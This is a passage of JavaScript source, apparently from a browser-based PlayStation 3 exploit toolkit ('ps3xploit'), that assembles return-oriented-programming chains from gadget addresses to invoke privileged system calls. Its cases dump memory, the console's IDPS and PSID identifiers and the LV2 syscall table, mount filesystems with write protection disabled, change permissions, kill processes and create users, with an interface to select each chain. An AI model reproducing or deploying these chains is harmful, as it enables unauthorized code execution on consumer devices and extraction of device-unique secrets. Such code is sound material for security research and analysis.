    a4_r10=10;
    a4_r29=29;
    a4_r30=30;
    a4_r31=31;
    a4_jumpto=g_set_r4_thru_r11;
    a5_jumpto=g_set_r3_from_r29;
    a6_r29=0x00000420;
    a6_jumpto=g_sc_A0;
    extra1=0x00000420;
    a7_jumpto=restore_stack;
    extra2=g_exit_chain;
}

function syscallRebootOnly(mode,lpar_param,lpar_size)
{
    a1_r3=mode;
    a1_r4=lpar_param;
    a1_r5=lpar_size;
    a1_r11=sc_shutdown;
    a1_jumpto=g_set_r4_thru_r11;
    a2_jumpto=g_set_r3_from_r29;
    a3_jumpto=g_sc_A0;
}

function callExportAndExit(r3,r4,r5,r6,r7,r8,r9,r10,r11,r30,r31,export_addr)
{
    a1_r3=r3;
    a1_r4=r4;
    a1_r5=r5;
    a1_r6=r6;
    a1_r7=r7;
    a1_r8=r8;
    a1_r9=r9;
    a1_r10=r10;
    a1_r11=r11;
    a1_r29=r29;
    a1_r30=r30;
    a1_r31=r31;
    a1_jumpto=g_set_r4_thru_r11;
    a2_jumpto=g_set_r3_from_r29;
    a3_jumpto=export_addr;
    a4_r11=restore_stack;
    a4_jumpto=g_set_r4_thru_r11;
    a5_jumpto=g_exit_chain;
}

function openReadDeviceAndExit(device_id,src,dest)
{
    a1_r4=sc_sso_mode;
    a1_r5=fd_addr;
    a1_r6=sc_sso_flags;
    a1_r9=magic_addr;// pointer to load next gadget into r0
    a1_r11=sc_sys_storage_open;
    a1_jumpto=g_set_r4_thru_r11;
    extra2=device_flag;
    extra3=device_id;
    a2_jumpto=g_set_r3_with_ld;
    a3_jumpto=g_set_r4_thru_r11;
    a3_r30=g_set_r3_from_r29;
    a4_r3=fd_addr;
    a4_r4=sc_ssr_mode;
    a4_r5=st_sec;
    a4_r6=step_sector;
    a4_r7=temp_addr_8C;
    a4_r8=fd2_addr;
    a4_r9=sc_ssr_flags;
    a4_r11=sc_sys_storage_read;
    a5_jumpto=g_set_r3_from_r29;
    a6_r3=fd_addr;
    a6_r11=sc_sys_storage_close;
    a6_jumpto=g_set_r4_thru_r11;
    a7_jumpto=g_set_r3_from_r29;
    a8_r31=sc_shutdown_soft;
    a8_jumpto=e_fopen_write_close;
    a8_r6=sc_shutdown;
    a8_r29=0x10;
    a8_r30=temp_addr_8C;
    a8_jumpto=g_set_r4_thru_r11;
    a9_r5=0x00000000;
    a9_r6=0x00000000;
    a10_r31=g_sc_A0;
}

function useCustomStackFrame()
{
    switch(chain_stackframe)
    {
        case "stackframe_test":
        stackFrameTest();
        break;
        
        // uses restore_stack1
        case "beep_test":
        syscallAndExit(sc_buzzer_arg1,sc_buzzer_arg2,sc_buzzer_no_of_beeps,0,0,0,0,0,sc_sys_sm_ring_buzzer,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "power_test":
        syscallRebootOnly(reboot_mode,0x00000000,0x00000000);
        break;
        
        case "db_rebuild":
        syscallFwriteAndReboot(path_dest_fp_addr,0x4,write_bytes_addr,reboot_mode,0,0);
        break;
        
        // does not use embedded restore_stack
        case "mem_dump_test":
        syscallFwriteAndExit(sc_buzzer_arg1,sc_buzzer_arg2,sc_buzzer_arg3,0,0,0,0,0,sc_sys_sm_ring_buzzer,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,memdump_size,memdump_addr);
        break;
        
        // does not use embedded restore_stack
        case "minver_check":
        syscallAndExit(0x00006011,0x00000001,temp_addr_8C,0,0,0,0,0,update_manager_if,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        // thread stopped at 000D7430 48299C99 bl         0x003710C8 
        // 000D6544 4829AD45 bl         0x00371288
        // 000D6644 48008C7D bl         0x000DF2C0
        // 000D6728 480092FD bl         0x000DFA24
        // 000D6A20 48558651 bl         0x0062F070
        // 000D6F90 485321F5 bl         0x00609184
        // memcontainer?? 000D6604 4BFF0591 bl         0x000C6B94 
        // 000D6644 48008C7D bl         0x000DF2C0
        // dev game_debug 000D671C 4855A27D bl         0x00630998 
        // bdp_plugin 000D72C0 482826C9 bl         0x00359988
        // 000D6644 48008C7D bl         0x000DF2C0
        case "game_debug_pafjob_test":
        callExportAndExit(sc_buzzer_arg1,sc_buzzer_arg2,sc_buzzer_no_of_beeps,0,0,0,0,0,sc_sys_sm_ring_buzzer,temp_addr_8A,temp_addr_8B,s_unk_game_debug_pafjob)
        break;
        
        // does not use embedded restore_stack
        case "get_open_psid":
        syscallFwriteAndExit(temp_addr_8D,0,0,0,0,0,0,0,sc_sys_ss_get_open_psid,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,0x10,temp_addr_8D);
        break;
        
        case "console_write_test":
        syscallAndExit(path_src_fp_addr,console_write_len,0,0,0,0,0,0,sc_sys_console_write,temp_addr_8A,temp_addr_8B);
        break;
        
        case "sys_tty_read":
        syscallAndExit(path_src_fp_addr,temp_addr_8C,tty_read_size,tty_read_size,0,0,0,0,sc_sys_tty_read,temp_addr_8A,temp_addr_8B);
        break;
        
        case "sys_tty_write":
        syscallAndExit(path_src_fp_addr,temp_addr_8C,path_src_fp_addr.length,path_src_fp_addr.length,0,0,0,0,sc_sys_tty_write,temp_addr_8A,temp_addr_8B);
        break;
        
        // does not use embedded restore_stack
        case "dump_idps_from_mem":
        syscallFwriteAndExit(sc_buzzer_arg1,sc_buzzer_arg2,sc_buzzer_arg3,0,0,0,0,0,sc_sys_sm_ring_buzzer,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,0x10,addr_idps);
        break;
        
        case "sys_sm_get_platform_info":
        syscallFwriteAndExit(sys_sm_get_platform_info_ptr,0,0,0,0,0,0,0,sc_sys_sm_get_platform_info,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,sys_sm_get_platform_info_size,sys_sm_get_platform_info_ptr);
        break;
        
        case "webkit_search_area":
        syscallFwriteAndExit(sc_buzzer_arg1,sc_buzzer_arg2,sc_buzzer_arg3,0,0,0,0,0,sc_sys_sm_ring_buzzer,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,0x5FFFFF,0x80100000);
        break;
        
        /*
        case "dump_idps_from_flash":
        openReadDeviceAndExit(0x4,path_src_fp_addr,path_dest_fp_addr);
        break;
        */
        
        case "file_read_write_test":
        if(useAutoSize)
        {
            syscallReadWriteFileAuto(path_src_fp_addr,path_dest_fp_addr);
        }
        else
        {
            syscallReadWriteFile(path_src_fp_addr,path_dest_fp_addr,file_size);
        }
        break;
        
        case "dir_read_write_test":
        syscallReadWriteDirectory(path_src_fp_addr,path_dest_fp_addr);
        break;
        
        case "sys_net_dump":
        a1_r3=sys_net_open_dump_len;
        a1_r4=sys_net_open_dump_flags;
        a1_r11=sc_sys_net_open_dump;
        a1_jumpto=g_set_r4_thru_r11;
        a2_jumpto=g_set_r3_from_r29;
        a3_jumpto=g_sc_A0;
        a4_r3=sys_net_read_dump_id;
        a4_r4=sys_net_read_dump_buf_ptr;
        a4_r5=sys_net_read_dump_id_len;
        a4_r6=sys_net_read_dump_id_pflags_ptr;
        a4_r11=sc_sys_net_read_dump;
        a4_jumpto=g_set_r4_thru_r11;
        a5_jumpto=g_set_r3_from_r29;
        a6_jumpto=g_sc_A0;
        a7_r3=sys_net_write_dump_buf_ptr;
        a7_r11=sc_sys_net_write_dump;
        a7_jumpto=g_set_r4_thru_r11;
        a8_jumpto=g_set_r3_from_r29;
        a9_jumpto=g_sc_set_r3_from_r9;
        a10_r3=sys_net_close_dump_id;
        a10_r8=sys_net_close_dump_pflags_ptr;// register is r4
        a10_r6=sys_net_close_dump_id;// register is r9
        extra5=g_set_r4_thru_r11;
        extra1=g_set_r3_from_r29;
        extra3=g_sc_set_r3_from_r9;
        extra4=sc_sys_net_close_dump;// register is r11
        a13_r30=g_set_r31_F8;
        a16_jumpto=e_fopen_write_close;
        a15_jumpto=g_sc_set_r3_from_r10;
        a17_jumpto=g_set_r4_thru_r11;
        a18_jumpto=g_sc_A0
        a19_jumpto=g_set_r31_108;
        a20_r10=sc_sys_fs_close;
        a21_r10=hdd_fp_addr;
        a20_jumpto=g_set_r4_thru_r11;
        a22_jumpto=g_sc_set_r3_from_r10;
        a21_jumpto=g_set_r4_thru_r11;
        a23_jumpto=g_set_r4_thru_r11;
        a24_r11=restore_stack;
        a24_jumpto=g_exit_chain;
        a25_r11=restore_stack;
        break;
        
        // uses restore_stack1
        case "sys_fs_chmod":
        syscallAndExit(path_dest_fp_addr,sc_chmod_arg,0,0,0,0,0,0,sc_sys_fs_chmod,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_fs_chown":
        syscallAndExit(path_dest_fp_addr,sc_chown_arg,sc_chown_arg,0,0,0,0,0,sc_sys_fs_chown,temp_addr_8A,temp_addr_8B);
        break;
        
        case "sys_fs_get_fs_info":
        syscallFwriteAndExit(fs_get_fs_info_arg1,fs_get_fs_info_arg2,fs_get_fs_info_buffer,0,0,0,0,0,sc_sys_fs_get_fs_info,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,fs_get_fs_info_dump_size,temp_addr_8C);
        break;
        
        case "sys_fs_get_mount_info":
        syscallFwriteAndExit(fs_get_mount_info_arg1,fs_get_mount_info_arg2,fs_get_mount_info_arg3,0,0,0,0,0,sc_sys_fs_get_mount_info,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,fs_get_fs_info_dump_size,temp_addr_8C);
        break;
        
        // uses restore_stack1
        case "sys_fs_mapped_allocate":
        syscallAndExit(fs_mapped_allocate_arg1,fs_mapped_allocate_arg2,fs_mapped_allocate_arg3,0,0,0,0,0,sc_sys_fs_mapped_allocate,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_fs_mapped_free":
        syscallAndExit(fs_mapped_free_arg1,fs_mapped_free_arg2,0,0,0,0,0,0,sc_sys_fs_mapped_free,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_fs_mkdir":
        syscallAndExit(path_dest_fp_addr,sc_fs_mode,0,0,0,0,0,0,sc_sys_fs_mkdir,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_fs_newfs":
        syscallAndExit(fs_newfs_device_name,fs_newfs_arg2,fs_newfs_arg3,0,0,0,0,0,sc_sys_fs_newfs,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_fs_rename":
        syscallAndExit(path_src_fp_addr,path_dest_fp_addr,0,0,0,0,0,0,sc_sys_fs_rename,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_fs_rmdir":
        syscallAndExit(path_dest_fp_addr,0,0,0,0,0,0,0,sc_sys_fs_rmdir,temp_addr_8A,temp_addr_8B);
        break;
        
        case "sys_fs_stat":
        syscallFwriteAndExit(path_src_fp_addr,temp_addr_8C,0,0,0,0,0,0,sc_sys_fs_stat,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,0x34,temp_addr_8C);
        break;
        
        // uses restore_stack1
        // EXDEV         -2147418064    /* 0x80010030 */
        case "sys_fs_link":
        syscallAndExit(path_src_fp_addr,path_dest_fp_addr,0,0,0,0,0,0,sc_sys_fs_link,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_fs_symbolic_link":
        syscallAndExit(path_src_fp_addr,path_dest_fp_addr,0,0,0,0,0,0,sc_sys_fs_symbolic_link,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_fs_unlink":
        syscallAndExit(path_dest_fp_addr,0,0,0,0,0,0,0,sc_sys_fs_unlink,temp_addr_8A,temp_addr_8B);
        break;
        
        case "sys_fs_mount":
        syscallAndExit(path_fp_addr,path_fp2_addr,path_src_fp_addr,fs_mount_arg4,fs_mount_write_protection,fs_mount_arg6,fs_mount_arg7,fs_mount_arg8,sc_sys_fs_mount,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_fs_unmount":
        syscallAndExit(mount_path,fs_unmount_arg2,fs_unmount_arg3,0,0,0,0,0,sc_sys_fs_unmount,temp_addr_8A,temp_addr_8B);
        break;
        
        // does not use restore_stack1 restore_stack
        case "sys_storage_get_device_info":
        syscallAndExit(storage_get_device_info_device,storage_get_device_info_buffer_ptr,storage_get_device_info_arg3,storage_get_device_info_arg4,0,0,0,0,sc_sys_storage_get_device_info,temp_addr_8A,temp_addr_8B);
        break;
        
        // does not use embedded restore_stack
        case "sys_storage_report_devices":
        syscallFwriteAndExit(storage_report_devices_arg1_ptr,storage_report_devices_arg2,storage_report_devices_arg3_ptr,storage_report_devices_arg4,0,0,0,0,sc_sys_storage_report_devices,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,0x40,temp_addr_8C);
        break;
        
        // uses restore_stack1
        case "sys_process_exit":
        getProcessIDFromHTML();
        syscallAndExit(process_exit_pid,0,0,0,0,0,0,0,sys_ppu_thread_exit,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_process_kill":
        getProcessIDFromHTML();
        syscallAndExit(process_kill_pid,0,0,0,0,0,0,0,sc_sys_process_kill,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_ppu_thread_create":
        getThreadIDFromHTML();
        syscallAndExit(thread_create_id,thread_create_bin,thread_create_bin_arg,thread_create_prio,thread_create_stk_size,thread_create_flags,thread_create_name,0,sys_ppu_thread_create,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_ppu_thread_exit":
        getThreadIDFromHTML();
        syscallAndExit(thread_exit_arg1,0,0,0,0,0,0,0,sys_ppu_thread_exit,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_ppu_thread_restart":
        getThreadIDFromHTML();
        syscallAndExit(thread_restart_arg1,0,0,0,0,0,0,0,sys_ppu_thread_restart,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_ppu_thread_start":
        getThreadIDFromHTML();
        syscallAndExit(thread_start_arg1,0,0,0,0,0,0,0,sys_ppu_thread_start,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_ppu_thread_stop":
        getThreadIDFromHTML();
        syscallAndExit(thread_stop_arg1,0,0,0,0,0,0,0,sys_ppu_thread_stop,temp_addr_8A,temp_addr_8B);
        break;
        
        case "ppu_thread_get_stack_info":
        syscallFwriteAndExit(temp_addr_8C,0,0,0,0,0,0,0,sc_ppu_thread_get_stack_info,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,0x8,temp_addr_8C);
        break;
        
        case "ppu_thread_get_priority":
        syscallFwriteAndExit(temp_addr_8C,0,0,0,0,0,0,0,sys_sys_ppu_thread_get_priority,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,0x10,temp_addr_8C);
        break;
        
        case "sys_sm_request_led":
        syscallFwriteAndExit(request_led_id,request_led_action,0,0,0,0,0,0,sc_sys_sm_request_led,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,0x20,temp_addr_8D);
        break;
        
        // uses restore_stack1
        case "sys_sm_control_led":
        syscallAndExit(control_led_id,control_led_action,0,0,0,0,0,0,sc_sys_sm_control_led,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack2
        case "sys_game_get_temperature":
        syscallTwoAndExit(get_temperature_cell,get_temperature_temp_cell_ptr,0,0,0,0,0,0,sc_sys_game_get_temperature,temp_addr_8A,temp_addr_8B,get_temperature_rsx,get_temperature_temp_rsx_ptr,0,0,0,0,0,0,sc_sys_game_get_temperature,temp_addr_8A,temp_addr_8B);
        break;
        
        case "sys_sm_get_fan_policy":
        // a1_r3=sys_sm_request_led_id;
        // a1_r4=sys_sm_request_led_action;
        // a1_r11=sc_sys_sm_get_fan_policy;
        // a1_jumpto=g_set_r4_thru_r11;
        // a2_jumpto=g_set_r3_from_r29;
        // a3_jumpto=g_sc_A0;
        // a4_r3=path_dest_fp_addr;
        // a4_r4=file_mode_fp_addr;
        // a4_r5=0x20;
        // a4_r30=request_led_return;
        // a4_jumpto=g_set_r4_thru_r11;
        // a5_jumpto=g_set_r3_from_r29;
        // a6_r29=0x20;
        // a6_jumpto=e_fopen_write_close;
        // extra1=0x20;
        // a7_jumpto=restore_stack;
        // extra2=g_exit_chain;
        break;
        
        /*
        value   mode    notes
        0       0x5f    sm_shutdown / manual mode   
        1       0x4d    < temp_control0     
        2       0x54    temp_control0 => temp_control1  
        3       0x60    temp_control0 <= temp_control1  
        4       0x68    >= temp_control1    
        5       0x70    >= temp_control2    
        6       0x78    >= temp_control3    
        7       0xA0    >= temp_control4 
        */
        /*
        case "sys_sm_set_fan_policy":
        a1_r3=0x0;
        a1_r4=0x2;
        a1_r5=set_fan_speed;
        a1_r11=sc_sys_sm_set_fan_policy;
        a1_jumpto=g_set_r4_thru_r11;
        a2_jumpto=g_set_r3_from_r29;
        a3_jumpto=g_sc_A0;
        a4_r11=restore_stack;
        a4_jumpto=g_set_r4_thru_r11;
        a5_jumpto=g_exit_chain;
        break;
        */
        
        case "sys_ss_utoken_if":
        syscallFwriteAndExit(sys_ss_utoken_if_packetid,sys_ss_utoken_if_tokenptr,sys_ss_utoken_if_size,0,0,0,0,0,sc_sys_ss_utoken_if,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,sys_ss_utoken_if_size,temp_addr_8D);
        break;
        
        case "dump_lv2_syscall_table":
        syscallFwriteAndExit(sys_ss_utoken_if_packetid,sys_ss_utoken_if_tokenptr,sys_ss_utoken_if_size_lv2,0,0,0,0,0,sc_sys_ss_utoken_if,temp_addr_8A,temp_addr_8B,path_dest_fp_addr,sys_ss_utoken_if_size_lv2,temp_addr_8D);
        break;
        
        // uses restore_stack1
        case "sys_rsx_memory_free":
        syscallAndExit(sys_rsx_memory_free_mem_ctx_id,0,0,0,0,0,0,0,sys_rsx_memory_free,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_net_open_dump":
        syscallAndExit(sys_net_open_dump_len,sys_net_open_dump_flags,0,0,0,0,0,0,sc_sys_net_open_dump,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_net_read_dump":
        syscallAndExit(sys_net_read_dump_id,sys_net_read_dump_buf_ptr,sys_net_read_dump_id_len,sys_net_read_dump_id_pflags_ptr,0,0,0,0,sc_sys_net_read_dump,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_net_write_dump":
        syscallAndExit(sys_net_write_dump_buf_ptr,0,0,0,0,0,0,0,sc_sys_net_write_dump,temp_addr_8A,temp_addr_8B);
        break;
        
        // uses restore_stack1
        case "sys_net_close_dump":
        syscallAndExit(sys_net_close_dump_id,sys_net_close_dump_pflags_ptr,0,0,0,0,0,0,sc_sys_net_close_dump,temp_addr_8A,temp_addr_8B);
        break;
        
        case "xmb_plugin_test":
        callExportAndExit(0,0,0,0,0,0,0,0,0,temp_addr_8A,temp_addr_8B,e_unk_xmb_plugin);
        break;
        
        case "busy_icon_test":
        callExportAndExit(0,0,0,0,0,0,0,0,0,temp_addr_8A,temp_addr_8B,s_start_busy_icon);
        break;
        
        case "vsh_printf_test":
        callExportAndExit(path_fp_addr,path_fp2_addr,0,0,0,0,0,0,0,temp_addr_8A,temp_addr_8B,e_unk_vsh_printf);
        //callExportAndExit(0,0,0,0,0,0,0,0,0,temp_addr_8A,temp_addr_8B,0x0E423C);
        break;
        
        case "create_new_user":
        callExportAndExit(0,0,0,0,0,0,0,0,0,temp_addr_8A,temp_addr_8B,s_create_new_user);
        break;
        
        default:
        alert(msg_cannot_continue);
        return;
        break;
    }
}

function setChainOptions(chain)
{
    switch(chain)
    {
        case "stackframe_test":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        alert(msg_stackframe_check);
        init_rop.focus();
        break;
        
        case "beep_test":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        number_of_beeps_edit.focus();
        break;
        
        case "power_test":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        disableElement("marked_reboot", false);
        marked_reboot.focus();
        break;
        
        case "db_rebuild":
        setValueToHTML("path_dest",path_db_rebuild);
        disableElement("path_src",true);// do not allow changing path
        disableElement("path_src_type",true);
        disableElement("path_dest",true);// do not allow changing path
        disableElement("path_dest_type",true);
        disableElement("marked_xmb_select",true);
        init_rop.focus();
        break;
        
        case "minver_check":
        setDefaultGuiParams();
        break;
        
        case "game_debug_pafjob_test":
        setDefaultGuiParams();
        break;
        
        case "mem_dump_test":
        setValueToHTML("path_src","");
        disableElement("path_src",true);
        disableElement("path_src_type",true);
        disableElement("marked_memdump_addr", false);
        disableElement("marked_memdump_size", false);
        disableElement("marked_memdump_range", false);
        disableElement("marked_memdump_addr_edit", false);
        disableElement("marked_memdump_size_edit", false);
        disableElement("memdump_save_new_values", false);
        setValueToHTML("path_dest",path_usb_memdump8);
        alert(msg_memdump_warning);
        marked_memdump_addr.focus();
        //marked_memdump_range.focus();
        break;
        
        case "file_read_write_test":
        setValueToHTML("path_src",path_usb_test_bin);
        setValueToHTML("path_dest",path_hdd_test_bin);
        if(useAutoSize){alert(msg_option_not_available);init_rop.focus();}else{file_size_edit.focus();}
        break;
        
        case "dir_read_write_test":
        setValueToHTML("path_src",usb_dir_ps3xploit);
        setValueToHTML("path_dest",hdd_dir_ps3xploit);
        alert(msg_option_not_available);
        //init_rop.focus();
        break;
        
        case "sys_net_dump":
        //setValueToHTML("path_src","");
        setValueToHTML("path_dest",path_sys_net_dump);
        init_rop.focus();
        break;
        
        case "get_open_psid":
        setValueToHTML("path_src","");
        disableElement("path_src",true);
        disableElement("path_src_type",true);
        setValueToHTML("path_dest",path_usb_psid_bin);
        init_rop.focus();
        break;
        
        case "sys_fs_get_fs_info":
        setValueToHTML("path_src","");
        disableElement("path_src",true);
        disableElement("path_src_type",true);
        setValueToHTML("path_dest",sys_fs_get_fs_info_dump);
        init_rop.focus();
        
        case "sys_fs_get_mount_info":
        setValueToHTML("path_src","");
        disableElement("path_src",true);
        disableElement("path_src_type",true);
        setValueToHTML("path_dest",sys_fs_get_mount_info_dump);
        init_rop.focus();
        break;
        
        case "sys_fs_mapped_allocate":
        setDefaultGuiParams();
        break;
        
        case "sys_fs_mapped_free":
        setDefaultGuiParams();
        break;
        
        case "console_write_test":
        setValueToHTML("path_src","");
        disableElement("path_src",true);
        disableElement("path_src_type",true);
        setValueToHTML("path_dest",console_write_dump);
        init_rop.focus();
        break;
        
        case "sys_tty_read":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        alert(msg_cobra_only);
        init_rop.focus();
        break;
        
        case "sys_tty_write":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        alert(msg_cobra_only);
        init_rop.focus();
        break;
        
        case "dump_idps_from_mem":
        setValueToHTML("path_src","");
        disableElement("path_src",true);
        disableElement("path_src_type",true);
        setValueToHTML("path_dest",path_usb_idps_bin);
        alert(msg_memdump_idps_vsh);
        init_rop.focus();
        break;
        
        case "dump_idps_from_flash":
        setValueToHTML("path_src","");
        disableElement("path_src",true);
        disableElement("path_src_type",true);
        setValueToHTML("path_dest",path_usb_idps_bin);
        init_rop.focus();
        break;
        
        case "sys_fs_chmod":
        setValueToHTML("path_src","");
        disableElement("path_src",true);
        disableElement("path_src_type",true);
        disableElement("marked_chmod",false);// enable dropdown
        setValueToHTML("path_dest",hdd_dir_ps3xploit);
        init_rop.focus();
        break;
        
        case "sys_fs_chown":
        setValueToHTML("path_src","");
        disableElement("path_src",true);
        disableElement("path_src_type",true);
        disableElement("marked_chown",false);// enable dropdown
        setValueToHTML("path_dest",hdd_dir_ps3xploit);
        init_rop.focus();
        break;
        
        case "sys_fs_mkdir":
        setValueToHTML("path_src","");
        disableElement("path_src",true);
        disableElement("path_src_type",true);
        setValueToHTML("path_dest",hdd_dir_ps3xploit);
        init_rop.focus();
        break;
        
        case "sys_fs_mount":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        alert(msg_mount_test);
        mounting_device.focus();
        break;
        
        case "sys_fs_unmount":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        mounting_path.focus();
        break;
        
        case "sys_fs_rename":
        setValueToHTML("path_src",hdd_dir_ps3xploit);
        setValueToHTML("path_dest",hdd_dir_ps3xploit_new);
        init_rop.focus();
        break;
        
        case "sys_fs_rmdir":
        setValueToHTML("path_src","");
        disableElement("path_src",true);
        disableElement("path_src_type",true);
        setValueToHTML("path_dest",hdd_dir_ps3xploit);
        alert(msg_remove_dir_warning);
        init_rop.focus();
        break;
        
        case "sys_fs_stat":
        setValueToHTML("path_src",dev_hdd0);
        setValueToHTML("path_dest",fs_stat_dump);
        path_src_type.focus();
        break;
        
        case "sys_fs_link":
        setValueToHTML("path_src",path_hdd_symlink_src);
        setValueToHTML("path_dest",path_usb_symlink_dest);
        init_rop.focus();
        break;
        
        case "sys_fs_symbolic_link":
        setValueToHTML("path_src",path_hdd_symlink_src);
        setValueToHTML("path_dest",path_usb_symlink_dest);
        init_rop.focus();
        break;
        
        case "sys_fs_unlink":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest",path_usb_symlink_dest);
        init_rop.focus();
        break;
        
        case "sys_storage_get_device_info":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest",path_storage_get_device_info_dump);
        init_rop.focus();
        break;
        
        case "sys_storage_report_devices":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest",path_storage_report_devices_dump);
        init_rop.focus();
        break;
        
        case "sys_sm_get_platform_info":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest",sys_sm_get_platform_info_dump);
        init_rop.focus();
        break;
        
        case "webkit_search_area":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest",webkit_search_area_dump);
        init_rop.focus();
        break;
        
        case "sys_storage_open":
        setDefaultGuiParams();
        break;
        
        case "sys_storage_read":
        setDefaultGuiParams();
        break;
        
        case "sys_process_exit":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        marked_hex_process_id.focus();
        break;
        
        case "sys_process_kill":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        marked_hex_process_id.focus();
        break;
        
        case "sys_ppu_thread_create":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        marked_hex_threads_id.focus();
        break;
        
        case "sys_ppu_thread_exit":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        marked_hex_threads_id.focus();
        break;
        
        case "sys_ppu_thread_restart":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        marked_hex_threads_id.focus();
        break;
        
        case "sys_ppu_thread_start":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        marked_hex_threads_id.focus();
        break;
        
        case "sys_ppu_thread_stop":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        marked_hex_threads_id.focus();
        break;
        
        case "ppu_thread_get_priority":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest",ppu_thread_get_priority_dump);
        marked_hex_threads_id.focus();
        break;
        
        case "ppu_thread_get_stack_info":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest",ppu_thread_get_stack_info_dump);
        marked_hex_threads_id.focus();
        break;
        
        case "sys_sm_request_led":
        setDefaultGuiParams();
        break;
        
        case "sys_sm_control_led":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        marked_hex_system_led_color.focus();
        break;
        
        case "sys_game_get_temperature":
        setDefaultGuiParams();
        break;
        
        case "sys_sm_get_fan_policy":
        setDefaultGuiParams();
        break;
        
        /*
        case "sys_sm_set_fan_policy":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest","");
        alert("ALERT!\n\nThis ONLY Currently Works With CFW!");
        marked_hex_system_fan_speed.focus();
        break;
        */
        
        case "sys_ss_utoken_if":
        setDefaultGuiParams();
        break;
        
        case "sys_rsx_memory_free":
        setDefaultGuiParams();
        break;
        
        case "sys_net_open_dump":
        setDefaultGuiParams();
        break;
        
        case "sys_net_read_dump":
        setDefaultGuiParams();
        break;
        
        case "sys_net_write_dump":
        setDefaultGuiParams();
        break;
        
        case "sys_net_close_dump":
        setDefaultGuiParams();
        break;
        
        case "dump_lv2_syscall_table":
        setValueToHTML("path_src","");
        setValueToHTML("path_dest",sys_ss_utoken_lv2_sc_table_dump);
        init_rop.focus();
        break;
        
        case "xmb_plugin_test":
        alert("DEX 4.81 ONLY");
        setDefaultGuiParams();
        break;
        
        case "busy_icon_test":
        alert("DEX 4.81 ONLY");
        setDefaultGuiParams();
        break;
        
        case "vsh_printf_test":
        alert("DEX 4.81 ONLY");
        setValueToHTML("path_src",vsh_printf_arg1);
        setValueToHTML("path_dest",vsh_printf_arg2);
        init_rop.focus();
        break;
        
        case "create_new_user":
        alert("DEX 4.81 ONLY");
        setDefaultGuiParams();
        break;
    }
    
}


// Default GUI Params
function setDefaultGuiParams(){
    setValueToHTML("path_src","");
    setValueToHTML("path_dest","");
    init_rop.focus();
} 

// Set Mounting Device
function mountSetDevice(device){
    mount_device = device.value;
    mounting_fs.focus();
} 

// Set Mounting File System
function mountSetFS(fs){
    mount_fs = fs.value;
    mounting_path.focus();
} 

// Set Mounting File System
function mountSetPath(path){
    mount_path = path.value;
    if(chain_stackframe==="sys_fs_mount"){write_protection_toggle.focus();}
    if(chain_stackframe==="sys_fs_unmount"){init_rop.focus();}
} 

// Get Process ID
function getProcessID(id){
    process_kill_pid = id.value;
    init_rop.focus();
    return process_kill_pid;
} 

function getProcessIDFromHTML(){
    process_kill_pid = getValueFromHTML("marked_hex_process_id");
    //alert(process_kill_pid);
} 

// Toggle Write Protect
function toggleWriteProtect(){
    if(write_protect)
    {
        fs_mount_write_protection=0x00000000;
        write_protect=false;
        alert(msg_warning_write_protection);
    }
    else
    {
